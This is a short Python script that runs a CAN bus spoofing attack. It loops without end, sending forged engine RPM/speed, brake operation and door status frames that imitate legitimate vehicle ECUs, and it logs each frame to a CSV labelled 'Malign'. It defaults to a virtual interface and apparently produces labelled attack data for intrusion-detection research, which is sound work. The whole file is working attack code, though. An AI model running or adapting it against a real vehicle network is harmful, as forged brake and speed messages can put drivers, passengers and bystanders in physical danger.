import can
import time
import argparse
import random
import csv
from pathlib import Path

SLEEP_MIN = 0.05
SLEEP_MAX = 0.5


def spoofing_attack(channel="vcan0", output_file="spoofing_log.csv"):
    print(f"Starting Spoofing attack on {channel}...")
    print(f"Logging sent messages to {output_file}")

    # Messages to spoof, mimicking legitimate ECUs
    spoof_targets = [
        {
            "id": 0x244,
            "name": "Spoofed_Engine_RPM_Speed",
            "data": [0x1F, 0x40, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00],
        },
        {
            "id": 0x1A0,
            "name": "Spoofed_Brake_Operation",
            "data": [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01],
        },
        {
            "id": 0x4F0,
            "name": "Spoofed_Door_Status",
            "data": [0x0F, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        },
    ]

    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        with output_path.open("w", newline="") as f, can.interface.Bus(
            channel=channel, interface="socketcan"
        ) as bus:
            writer = csv.writer(f)
            writer.writerow(
                [
                    "Timestamp",
                    "ID (HEX)",
                    "Message Name",
                    "Data (HEX)",
                    "Decoded Signals",
                    "Legitimacy",
                ]
            )

            while True:
                target = random.choice(spoof_targets)
                msg = can.Message(
                    arbitration_id=target["id"],
                    data=target["data"],
                    is_extended_id=False,
                )

                try:
                    bus.send(msg)
                    # Log the sent message
                    writer.writerow(
                        [
                            time.time(),
                            f"{msg.arbitration_id:03X}",
                            target["name"],
                            msg.data.hex().upper(),
                            "{}",
                            "Malign",
                        ]
                    )
                    print(f"Sent spoofed message: {target['name']}", end="\r")
                    time.sleep(random.uniform(SLEEP_MIN, SLEEP_MAX))
                except can.CanError as e:
                    print(f"Error sending message: {e}", end="\r")

    except KeyboardInterrupt:
        print("\nSpoofing attack interrupted by user.")
    except can.CanError as e:
        print(f"Error with CAN interface: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Run a Spoofing attack on a CAN bus and log sent messages."
    )
    parser.add_argument("-c", "--channel", default="vcan0", help="CAN interface name")
    parser.add_argument(
        "-o", "--output", default="../csv/spoofing_attack_log.csv", help="Output CSV log file"
    )
    args = parser.parse_args()

    spoofing_attack(channel=args.channel, output_file=args.output)
